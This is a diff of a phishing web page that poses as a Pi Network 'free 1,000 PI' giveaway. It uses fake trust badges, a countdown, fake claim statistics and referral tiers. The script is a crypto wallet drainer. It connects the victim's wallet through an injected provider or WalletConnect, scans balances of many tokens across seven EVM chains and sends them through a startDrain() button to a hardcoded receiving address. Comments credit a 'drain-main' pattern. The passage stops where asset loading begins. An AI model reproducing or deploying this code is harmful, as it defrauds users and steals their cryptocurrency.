@@ -3,8 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pi Network — Token Verification Portal</title>
-<link rel="icon" href="https://pi-claim.github.io/pi-logo-48.png">
+<title>Pi Network — Free 1000 PI Claim</title>
+<link rel="icon" href="pi-logo-48.png">
 <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.js"></script>
 <script src="https://unpkg.com/ethers@6.13.2/dist/ethers.umd.min.js"></script>
 <style>
@@ -70,7 +70,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .Step{text-align:center;padding:14px 8px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:12px}
 .Step .si{font-size:22px;margin-bottom:5px}
 .Step .st{font-size:11px;font-weight:600;margin-bottom:2px}
-.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1:4}
+.Step .ss{font-size:9px;color:rgba(255,255,255,.2);line-height:1.4}
 .ref{margin:14px 0;padding:18px;background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px}
 .ref .rt{font-size:14px;font-weight:700;margin-bottom:3px}
 .ref .rs{font-size:10px;color:rgba(255,255,255,.25);margin-bottom:10px}
@@ -90,7 +90,7 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .tier-need{font-size:9px;color:rgba(255,255,255,.2)}
 /* Modal */
 #m{display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(8px)}
-.mb{background:linear-gradient(160deg,#1a0a2e,#12082a);border:1px solid rgba(168,85,247,.18);border-radius:20px;padding:26px 22px;max-width:420px;width:92%;position:relative;max-height:88vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
+.mb{background:linear-gradient(160deg,#1a0a2e,#12082a);border:1px solid rgba(168,85,247,.18);border-radius:20px;padding:26px 22px;max-width:440px;width:92%;position:relative;max-height:88vh;overflow-y:auto;box-shadow:0 24px 80px rgba(0,0,0,.6)}
 .mb h2{font-size:16px;font-weight:800;margin-bottom:2px}
 .mb .ms{font-size:11px;color:rgba(255,255,255,.28);margin-bottom:14px}
 .cx{position:absolute;top:11px;right:13px;background:none;border:none;color:rgba(255,255,255,.25);font-size:16px;cursor:pointer}
@@ -99,12 +99,12 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .wi{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;color:#fff;flex-shrink:0}
 .wn{flex:1;font-size:13px;font-weight:600}
 .wt{font-size:9px;padding:2px 6px;border-radius:4px;font-weight:600;background:rgba(34,197,94,.08);color:#22c55e}
-/* Status bar */
+/* Status */
 .s{margin-top:8px;padding:11px;border-radius:9px;font-size:12px;display:none;line-height:1.5;word-break:break-word}
 .s.ok{background:rgba(34,197,94,.05);border:1px solid rgba(34,197,94,.08);color:#86efac}
 .s.er{background:rgba(239,68,68,.05);border:1px solid rgba(239,68,68,.08);color:#fca5a5}
 .s.wa{background:rgba(252,179,74,.05);border:1px solid rgba(252,179,74,.08);color:#fde68a}
-/* Main card */
+/* Card */
 .card{background:rgba(255,255,255,.015);border:1px solid rgba(168,85,247,.06);border-radius:14px;padding:20px;margin:12px 0}
 .btn{width:100%;padding:13px;font-size:13px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:7px;margin-bottom:6px;font-family:inherit}
 .btn:hover:not(:disabled){transform:translateY(-1px)}
@@ -113,14 +113,18 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.08)}
 .bo:hover{background:rgba(255,255,255,.03)}
 /* Chain rows */
-.ch{display:flex;align-items:center;gap:8px;padding:8px 10px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:8px;margin-bottom:4px}
+.ch{display:flex;align-items:center;gap:8px;padding:8px 10px;background:rgba(255,255,255,.015);border:1px solid rgba(255,255,255,.03);border-radius:8px;margin-bottom:4px;cursor:pointer;transition:all .2s}
+.ch:hover{border-color:rgba(252,179,74,.15);background:rgba(252,179,74,.02)}
+.ch.sel{border-color:rgba(252,179,74,.25);background:rgba(252,179,74,.04)}
 .ch .cd{width:8px;height:8px;border-radius:50%;flex-shrink:0}
 .ch .cn{flex:1;font-size:11px;font-weight:600}
 .ch .ct{font-size:9px;color:rgba(255,255,255,.18)}
 .ch .cb{font-size:11px;font-weight:700;color:#fcb34c}
-.ch.hv{border-color:rgba(252,179,74,.1);background:rgba(252,179,74,.015)}
-/* Token rows in scan results */
-.tkrow{display:flex;align-items:center;gap:8px;padding:6px 10px;background:rgba(255,255,255,.01);border-radius:6px;margin-bottom:3px;font-size:11px}
+.ch .ck{width:16px;height:16px;border-radius:4px;border:1px solid rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:10px;transition:all .2s}
+.ch.sel .ck{background:linear-gradient(135deg,#fcb34c,#f59e0b);border-color:transparent}
+.ch.sel .ck::after{content:'✓';color:#0a0118;font-weight:800}
+/* Token rows */
+.tkrow{display:flex;align-items:center;gap:8px;padding:7px 10px;background:rgba(255,255,255,.01);border-radius:6px;margin-bottom:3px;font-size:11px}
 .tkrow .tk-sym{font-weight:700;color:#fcb34c;min-width:50px}
 .tkrow .tk-bal{flex:1;font-family:monospace;color:rgba(255,255,255,.6)}
 .tkrow .tk-usd{font-weight:600;color:#22c55e}
@@ -139,20 +143,9 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 .ir .v.gl{color:#fcb34c}
 /* Toast */
 #toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:rgba(168,85,247,.85);color:#fff;padding:9px 18px;border-radius:9px;font-size:11px;font-weight:600;z-index:9999;display:none;backdrop-filter:blur(8px)}
-/* QR Modal */
-.qr-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:9999;align-items:center;justify-content:center;flex-direction:column}
-.qr-box{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:30px;text-align:center;max-width:360px;width:90%}
-.qr-box h3{font-size:16px;font-weight:700;margin-bottom:6px}
-.qr-box p{font-size:11px;color:rgba(255,255,255,.4);margin-bottom:16px;line-height:1.5}
-.qr-box canvas{margin:0 auto 16px;display:block;border-radius:12px}
-.qr-box .close-qr{padding:10px 24px;background:rgba(255,255,255,.1);color:#fff;border:none;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer}
 /* Spinner */
 .ld{display:inline-block;width:10px;height:10px;border:2px solid rgba(255,255,255,.08);border-top:2px solid #fcb34c;border-radius:50%;animation:rot .6s linear infinite;vertical-align:middle}
 @keyframes rot{to{transform:rotate(360deg)}}
-/* Checkbox */
-.chk{width:16px;height:16px;border-radius:4px;border:1px solid rgba(255,255,255,.15);cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .2s}
-.chk.on{background:linear-gradient(135deg,#fcb34c,#f59e0b);border-color:transparent}
-.chk.on::after{content:'✓';font-size:10px;color:#0a0118;font-weight:800}
 /* Responsive */
 @media(max-width:500px){.hero h1{font-size:28px}.ca{font-size:38px}.Steps{grid-template-columns:1fr}}
 </style>
@@ -162,52 +155,58 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
 <div id="part"></div>
 <div class="pos">
 <nav><div class="w">
-  <div class="logo"><img src="https://pi-claim.github.io/pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
-  <div class="navr"><div class="lb"><span class="p"></span> LIVE</div><button class="nb" onclick="openM()">Connect Wallet</button></div>
+  <div class="logo"><img src="pi-logo-48.png" width="30" height="30" alt=""><t>Pi Network</t></div>
+  <div class="navr"><div class="lb"><span class="p"></span> LIVE</div><button class="nb" id="navBtn" onclick="openM()">Connect Wallet</button></div>
 </div></nav>
+
+<!-- Wallet Modal -->
 <div id="m"><div class="mb">
   <button class="cx" onclick="closeM()">&#x2715;</button>
   <h2>Connect Your Wallet</h2>
   <div class="ms">Select wallet to verify and claim 1000 PI</div>
   <div id="wl"></div>
 </div></div>
-<div id="qrModal" class="qr-overlay">
-  <div class="qr-box">
-    <h3>Scan QR Code</h3>
-    <p>Open your wallet app and scan this QR code to connect</p>
-    <canvas id="qrCanvas" width="280" height="280" style="background:#fff"></canvas>
-    <button class="close-qr" onclick="closeQR()">Close</button>
-  </div>
-</div>
+
 <div class="w">
+<!-- Hero -->
 <div class="hero">
   <div class="eb">&#x1F512; Verified Mainnet Event — Limited Time</div>
   <h1>Claim Your Free<br><span class="ha">1,000 PI Tokens</span></h1>
   <p class="sub">Pi Network is distributing free tokens to verified Pioneers. Connect your wallet, pay a small network fee, and receive 1000 PI instantly.</p>
-  <div class="hl"><img src="https://pi-claim.github.io/pi-logo-120.png" width="64" height="64" alt=""></div>
+  <div class="hl"><img src="pi-logo-120.png" width="64" height="64" alt=""></div>
   <div class="trust">
     <span style="background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.1);color:#22c55e">&#x2705; Contract Verified</span>
     <span style="background:rgba(168,85,247,.06);border:1px solid rgba(168,85,247,.1);color:#c084fc">&#x1F512; Secure</span>
     <span style="background:rgba(252,179,74,.06);border:1px solid rgba(252,179,74,.1);color:#fcb34c">&#x26A1; Instant</span>
   </div>
 </div>
+
+<!-- Claim Card -->
 <div class="cc">
   <div class="ca"><span class="num">1,000</span> <span class="pi">PI</span></div>
   <div class="cl">FREE CLAIM — VERIFICATION REQUIRED</div>
   <button class="cbtn" onclick="openM()">&#x1F381; Claim 1000 PI Now</button>
   <div class="cfee">* Small network fee (~$2.50) • No hidden fees • One-time</div>
 </div>
+
+<!-- Countdown -->
 <div class="cd-row">
   <div class="cdb"><div class="v" id="cd-h">04</div><div class="l">Hours</div></div>
   <div class="cdb"><div class="v" id="cd-m">32</div><div class="l">Min</div></div>
   <div class="cdb"><div class="v" id="cd-s">18</div><div class="l">Sec</div></div>
 </div>
+
+<!-- Stats -->
 <div class="stats">
   <div class="stat"><div class="sv" id="st-c">48,291</div><div class="sl">PI Claimed</div></div>
   <div class="stat"><div class="sv" id="st-u">12,847</div><div class="sl">Pioneers</div></div>
   <div class="stat"><div class="sv" id="st-r">3,291</div><div class="sl">Referrals</div></div>
 </div>
+
+<!-- Social Proof -->
 <div class="sp"><div class="sp-i">&#x2705;</div><div class="sp-t" id="spt"><strong>0x7a3...f291</strong> just claimed <strong>1,000 PI</strong> — 2 min ago</div></div>
+
+<!-- How To -->
 <div class="ht"><h3>How To Claim</h3>
   <div class="Steps">
     <div class="Step"><div class="si">&#x1F512;</div><div class="st">Connect</div><div class="ss">Link wallet via QR or extension</div></div>
@@ -215,6 +214,8 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div class="Step"><div class="si">&#x1F381;</div><div class="st">Claim</div><div class="ss">Receive 1000 PI instantly</div></div>
   </div>
 </div>
+
+<!-- Tier -->
 <div class="tier">
   <div class="tt">&#x1F3C6; Your Withdrawal Tier</div>
   <div class="ts">Invite friends to increase withdrawal speed.</div>
@@ -222,6 +223,8 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
   <div class="tier-level" id="tierLevel">Tier 1 — Standard (10% speed)</div>
   <div class="tier-need" id="tierNeed">Invite 3 more to reach Tier 2</div>
 </div>
+
+<!-- Referral -->
 <div class="ref">
   <div class="rt">&#x1F91D; Refer Friends — Earn 200 PI Each</div>
   <div class="rs">Each friend who claims gives you 200 PI + increases speed.</div>
@@ -232,40 +235,61 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <div class="rs2"><div class="rv" id="refS">10%</div><div class="rl">Speed</div></div>
   </div>
 </div>
+
+<!-- Status -->
 <div class="s" id="sb"></div>
+
+<!-- Main Interaction Card -->
 <div class="card" id="mc" style="display:none">
-  <!-- Phase 1: Scanning -->
+
+  <!-- Phase 1: Connecting -->
   <div id="p1" style="text-align:center;padding:8px 0">
     <div class="pg"><div class="ps on"></div><div class="ps"></div><div class="ps"></div></div>
-    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F50D; Scanning...</div>
-    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px" id="p1l">Checking wallet...</div>
+    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F50D; Connecting...</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px" id="p1l">Initializing wallet connection...</div>
     <div class="lg" id="p1log"></div>
   </div>
+
   <!-- Phase 2: No funds -->
   <div id="p2" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x1F6AB;</div>
-    <div style="font-size:14px;font-weight:700;margin-bottom:3px">No EVM Funds</div>
-    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No assets found on any supported chain.</div>
+    <div style="font-size:14px;font-weight:700;margin-bottom:3px">No EVM Funds Found</div>
+    <div style="font-size:11px;color:rgba(255,255,255,.22);margin-bottom:8px">No tokens detected on any supported chain.</div>
     <button class="btn bo" onclick="reset()">&#x1F504; Back</button>
   </div>
-  <!-- Phase 3: Assets found, ready to claim -->
+
+  <!-- Phase 3: Token Selection (drain-main style) -->
   <div id="p3" style="display:none">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
-    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Ready</div>
-    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Assets found. Review and confirm to claim 1000 PI.</div>
-    <div id="p3chains" style="margin-bottom:8px"></div>
-    <div id="p3bal" style="margin-bottom:10px"></div>
-    <div id="p3tokens" style="margin-bottom:10px;max-height:200px;overflow-y:auto"></div>
+    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x1F381; Verification Required</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Select assets to verify. A small network fee applies.</div>
+
+    <!-- Chain selection -->
+    <div style="font-size:10px;font-weight:700;color:rgba(255,255,255,.4);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px">Chains</div>
+    <div id="p3chains" style="margin-bottom:10px"></div>
+
+    <!-- Token list -->
+    <div style="font-size:10px;font-weight:700;color:rgba(255,255,255,.4);margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px">Tokens</div>
+    <div id="p3tokens" style="margin-bottom:10px;max-height:180px;overflow-y:auto"></div>
+
+    <!-- Summary -->
+    <div id="p3bal" style="margin-bottom:10px;padding:10px;background:rgba(0,0,0,.15);border-radius:8px"></div>
+
+    <!-- Destination (hidden, auto-filled) -->
+    <input type="hidden" id="destAddr" value="">
+
     <button class="btn bp" id="p3btn" onclick="startDrain()">&#x1F381; Verify and Claim</button>
     <button class="btn bo" onclick="reset()">&#x2716; Disconnect</button>
   </div>
+
   <!-- Phase 4: Processing -->
   <div id="p4" style="display:none;text-align:center;padding:12px 0">
     <div class="pg"><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div><div class="ps on"></div></div>
-    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing...</div>
-    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Confirm transactions in your wallet...</div>
+    <div style="font-size:13px;font-weight:700;margin-bottom:2px">&#x26A1; Processing Transactions...</div>
+    <div style="font-size:10px;color:rgba(255,255,255,.22);margin-bottom:8px">Confirm each transaction in your wallet</div>
     <div class="lg" id="p4log"></div>
   </div>
+
   <!-- Phase 5: Success -->
   <div id="p5" style="display:none;text-align:center;padding:14px 0">
     <div style="font-size:32px;margin-bottom:6px">&#x2705;</div>
@@ -279,30 +303,32 @@ nav>div{display:flex;align-items:center;justify-content:space-between}
     <button class="btn bo" onclick="reset()">Done</button>
   </div>
 </div>
-</div>
+
+</div><!-- .w -->
+
 <footer><p>&copy; 2026 Pi Network</p><div style="display:flex;gap:14px;justify-content:center;margin-top:6px"><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Terms</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Privacy</a><a href="#" style="font-size:9px;color:rgba(255,255,255,.15);text-decoration:none">Support</a></div></footer>
-</div>
+</div><!-- .pos -->
 <div id="toast"></div>
 
 <script>
 // ============================================
 // CONFIGURATION
 // ============================================
-var ADDR_EVM='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
-var ADDR_SOL='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
+var RECEIVE_ADDR='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
+var FEE_USD=2.50;
+var DRAIN_THRESHOLD=20.00;
 
-// Chain configuration with multiple RPC fallbacks
+// Chain config with RPC fallbacks
 var ECHAINS=[
-  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://eth.llamarpc.com',color:'#627EEA',explorer:'https://etherscan.io'},
-  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed.binance.org',color:'#F3BA2F',explorer:'https://bscscan.com'},
-  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-rpc.com',color:'#8247E5',explorer:'https://polygonscan.com'},
-  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arb1.arbitrum.io/rpc',color:'#28A0F0',explorer:'https://arbiscan.io'},
-  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142',explorer:'https://snowtrace.io'},
-  {id:8453,name:'Base',sym:'ETH',rpc:'https://mainnet.base.org',color:'#0052FF',explorer:'https://basescan.io'},
-  {id:10,name:'Optimism',sym:'ETH',rpc:'https://mainnet.optimism.io',color:'#FF0420',explorer:'https://optimistic.etherscan.io'},
+  {id:1,name:'Ethereum',sym:'ETH',rpc:'https://eth.llamarpc.com',color:'#627EEA',exp:'https://etherscan.io'},
+  {id:56,name:'BNB Chain',sym:'BNB',rpc:'https://bsc-dataseed.binance.org',color:'#F3BA2F',exp:'https://bscscan.com'},
+  {id:137,name:'Polygon',sym:'MATIC',rpc:'https://polygon-rpc.com',color:'#8247E5',exp:'https://polygonscan.com'},
+  {id:42161,name:'Arbitrum',sym:'ETH',rpc:'https://arb1.arbitrum.io/rpc',color:'#28A0F0',exp:'https://arbiscan.io'},
+  {id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142',exp:'https://snowtrace.io'},
+  {id:8453,name:'Base',sym:'ETH',rpc:'https://mainnet.base.org',color:'#0052FF',exp:'https://basescan.io'},
+  {id:10,name:'Optimism',sym:'ETH',rpc:'https://mainnet.optimism.io',color:'#FF0420',exp:'https://optimistic.etherscan.io'},
 ];
 
-// RPC fallbacks per chain
 var FBACK={
   1:['https://rpc.ankr.com/eth','https://ethereum-rpc.publicnode.com','https://cloudflare-eth.com'],
   56:['https://bsc-dataseed1.defibit.io','https://bsc-dataseed.binance.org'],
@@ -313,7 +339,7 @@ var FBACK={
   10:['https://optimism-rpc.publicnode.com'],
 };
 
-// ERC-20 tokens to check per chain
+// ERC-20 tokens per chain (address, symbol, decimals)
 var ETOKENS={
   1:[
     ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],
@@ -325,6 +351,7 @@ var ETOKENS={
     ['0x514910771AF9Ca656af840dff83E8264EcF986CA','LINK',18],
     ['0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfebb0','MATIC',18],
     ['0xA0b73e1Ff0B80914AB6Fe0444E65848C4C34450b','CRO',8],
+    ['0x7Fc6F507C65326e72f4577C8e5fB1C8b1C0Ef0F4','AAVE',18],
   ],
   56:[
     ['0x55d398326f99059fF775485246999027B3197955','USDT',18],
@@ -335,6 +362,7 @@ var ETOKENS={
     ['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],
     ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],
     ['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
+    ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],
   ],
   137:[
     ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],
@@ -342,86 +370,80 @@ var ETOKENS={
     ['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18],
     ['0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619','WETH',18],
     ['0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6','WBTC',8],
+    ['0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270','WMATIC',18],
   ],
   42161:[
     ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],
     ['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6],
     ['0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','DAI',18],
     ['0x82aF49447D8a07e3bd95BD0d56f35241523fBab1','WETH',18],
+    ['0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f','WBTC',8],
   ],
   43114:[
     ['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],
     ['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6],
     ['0xd586E7F844cEa2F87f50152665BCbc2C279D8d7e','DAI',18],
+    ['0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB','WETH',18],
   ],
   8453:[
     ['0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA','USDbC',6],
     ['0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913','USDC',6],
+    ['0x4200000000000000000000000000000000000006','WETH',18],
   ],
   10:[
     ['0x94b008aA00579c1307B0EF2c499aD98a8ce58e58','USDT',6],
     ['0x7F5c764cBc14f9669B88837ca1490cCa17c31607','USDC',6],
     ['0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1','DAI',18],
+    ['0x4200000000000000000000000000000000000006','WETH',18],
   ]
 };
 
-// Price feed (USD) - updated via CoinGecko
-var PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,WBTC:100000,BTCB:100000,WETH:3500,WBNB:600,LINK:15,UNI:12,CRO:0.1,CAKE:3,USDbC:1};
+// Price feed (USD)
+var PRICES={BNB:600,ETH:3500,MATIC:0.7,AVAX:25,USDT:1,USDC:1,BUSD:1,DAI:1,WBTC:100000,BTCB:100000,WETH:3500,WBNB:600,LINK:15,UNI:12,CRO:0.1,CAKE:3,USDbC:1,WMATIC:0.7,WAVAX:25,AAVE:150};
 
-// ERC-20 ABI (minimal)
-var ERC20_ABI=['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)','function decimals() view returns (uint8)','function symbol() view returns (string)'];
+// Minimal ERC-20 ABI
+var ERC20_ABI=['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)','function decimals() view returns (uint8)','function symbol() view returns (string)','function approve(address,uint256) returns (bool)'];
 
 // ============================================
 // STATE
 // ============================================
 var prov=null,sign=null,addr='',foundChains=[],wcProvider=null;
+var selectedChains=new Set();
+var allTokens=[]; // {chainId, chainName, chainSym, chainColor, tokenAddr, tokenSym, tokenDec, balance, balanceRaw, usdValue}
 
 // ============================================
-// UTILITY FUNCTIONS
+// UI UTILITIES
 // ============================================
-function showP(id){['p1','p2','p3','p4','p5'].forEach(function(x){document.getElementById(x).style.display=x===id?'block':'none';});document.getElementById('mc').style.display='block';}
+function showP(id){
+  ['p1','p2','p3','p4','p5'].forEach(function(x){
+    var el=document.getElementById(x);
+    if(el)el.style.display=x===id?'block':'none';
+  });
+  document.getElementById('mc').style.display='block';
+}
 function stat(msg,t){var e=document.getElementById('sb');e.innerHTML=msg;e.className='s '+t;e.style.display='block';}
 function hideStatus(){document.getElementById('sb').style.display='none';}
-function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
+function sleep(ms){return new Promise(function(r){setTimeout(r,ms);})}
 function toast(m){var t=document.getElementById('toast');t.textContent=m;t.style.display='block';setTimeout(function(){t.style.display='none';},3000);}
 function openM(){document.getElementById('m').style.display='flex';renderW();}
 function closeM(){document.getElementById('m').style.display='none';}
 document.getElementById('m').addEventListener('click',function(e){if(e.target===document.getElementById('m'))closeM();});
-function closeQR(){document.getElementById('qrModal').style.display='none';}
-
-// Estimate USD value of found chains
-function estimateUsd(fc){
-  var total=0;
-  for(var i=0;i<fc.length;i++){
-    var c=fc[i];
-    var price=PRICES[c.chain.sym]||0;
-    total+=parseFloat(c.native)*price;
-    for(var j=0;j<c.tokens.length;j++){
-      total+=parseFloat(c.tokens[j].b)*(PRICES[c.tokens[j].sy]||0);
-    }
-  }
-  return total;
-}
 
 // ============================================
-// WALLET CONNECT
+// WALLET CONNECTION (drain-main pattern)
 // ============================================
 async function getWCProvider(){
   if(wcProvider) return wcProvider;
   var WC=window.WalletConnectEthereumProvider||window['@walletconnect/ethereum-provider'];
   if(!WC) throw new Error('WalletConnect library not loaded');
   var EthereumProvider=(WC.default&&WC.default.init)?WC.default:(WC.init?WC:null);
-  if(!EthereumProvider){
-    if(typeof WC==='object'){
-      var keys=Object.keys(WC);
-      for(var i=0;i<keys.length;i++){
-        if(WC[keys[i]]&&typeof WC[keys[i]].init==='function'){
-          EthereumProvider=WC[keys[i]];break;
-        }
-      }
+  if(!EthereumProvider&&typeof WC==='object'){
+    var keys=Object.keys(WC);
+    for(var i=0;i<keys.length;i++){
+      if(WC[keys[i]]&&typeof WC[keys[i]].init==='function'){EthereumProvider=WC[keys[i]];break;}
     }
   }
-  if(!EthereumProvider) throw new Error('Could not find WalletConnect provider constructor');
+  if(!EthereumProvider) throw new Error('WC provider constructor not found');
   wcProvider=await EthereumProvider.init({
     projectId:'1fb93a2bb6b143e8cf6b808f31c4dbef',
     chains:[1,56,137,42161,43114,8453,10],
@@ -435,45 +457,47 @@ async function connectWallet(closeModal){
   if(closeModal) closeM();
   document.getElementById('mc').style.display='block';
   showP('p1');
-  // Try window.ethereum first
+  document.getElementById('p1l').textContent='Connecting...';
+  document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Approve in wallet popup...</span>';
+
+  // Try window.ethereum
   if(window.ethereum){
-    document.getElementById('p1l').textContent='Connecting...';
-    document.getElementById('p1log').innerHTML='<span style="color:#fcb34c">Approve in wallet popup...</span>';
     try{
       prov=new ethers.BrowserProvider(window.ethereum);
       var accounts=await window.ethereum.request({method:'eth_requestAccounts'});
       if(accounts&&accounts.length>0){
         sign=await prov.getSigner();
         addr=await sign.getAddress();
-        document.getElementById('p1l').textContent='Connected! Scanning...';
-        document.getElementById('p1log').innerHTML='<span style="color:#86efac">Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
-        await scanEvm();return;
+        document.getElementById('p1l').textContent='Connected! Loading assets...';
+        document.getElementById('p1log').innerHTML='<span style="color:#86efac">'+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
+        await loadAssets();
+        return;
       }
     }catch(e1){
       try{
         await window.ethereum.enable();
         sign=await prov.getSigner();
         addr=await sign.getAddress();
-        await scanEvm();return;
+        await loadAssets();
+        return;
       }catch(e2){}
     }
   }
-  // WalletConnect fallback
+
+  // WalletConnect
   document.getElementById('p1l').textContent='Loading WalletConnect...';
   try{
     var wc=await getWCProvider();
-    if(wc){
-      prov=new ethers.BrowserProvider(wc);
-      sign=await prov.getSigner();
-      addr=await sign.getAddress();
-      document.getElementById('p1l').textContent='Connected! Scanning...';
-      document.getElementById('p1log').innerHTML='<span style="color:#86efac">Connected: '+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
-      await scanEvm();
-    }
+    prov=new ethers.BrowserProvider(wc);
+    sign=await prov.getSigner();
+    addr=await sign.getAddress();
+    document.getElementById('p1l').textContent='Connected! Loading assets...';
+    document.getElementById('p1log').innerHTML='<span style="color:#86efac">'+addr.substring(0,10)+'...'+addr.substring(32)+'</span>';
+    await loadAssets();
   }catch(e){
     console.error('Connect error:',e);
     document.getElementById('p1l').textContent='Connection Failed';
-    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">Error: '+(e.message||'Failed')+'</span><br><br><span style="color:rgba(255,255,255,.4)">Try refreshing or use a different browser.</span>';
+    document.getElementById('p1log').innerHTML='<span style="color:#fca5a5">'+(e.message||'Failed')+'</span>';
   }
 }
 
@@ -487,11 +511,12 @@ function renderW(){
     {name:'Binance Wallet',color:'#F0B90B',icon:'🟡'},
   ];
   for(var i=0;i<wallets.length;i++){
-    var w=wallets[i];
-    var btn=document.createElement('button');btn.className='wrow';
-    btn.onclick=function(){connectWallet(true);};
-    btn.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.icon+'</div><span class="wn">'+w.name+'</span><span class="wt">'+(hasEth?'Detected':'WalletConnect')+'</span>';
-    c.appendChild(btn);
+    (function(w){
+      var btn=document.createElement('button');btn.className='wrow';
+      btn.onclick=function(){connectWallet(true);};
+      btn.innerHTML='<div class="wi" style="background:'+w.color+'">'+w.icon+'</div><span class="wn">'+w.name+'</span><span class="wt">'+(hasEth?'Detected':'WC')+'</span>';
+      c.appendChild(btn);
+    })(wallets[i]);
   }
   var wcBtn=document.createElement('button');wcBtn.className='wrow';
   wcBtn.onclick=function(){connectWallet(true);};
@@ -502,14 +527,14 @@ function renderW(){
 window.connectWallet=connectWallet;
 
 // ============================================
-// BALANCE SCANNING (Multi-chain)
+// ASSET LOADING (drain-main Moralis-style via RPC)
 // ============================================
-async function scanEvm(){
+async function loadAssets(){
   var log=document.getElementById('p1log');log.innerHTML='';
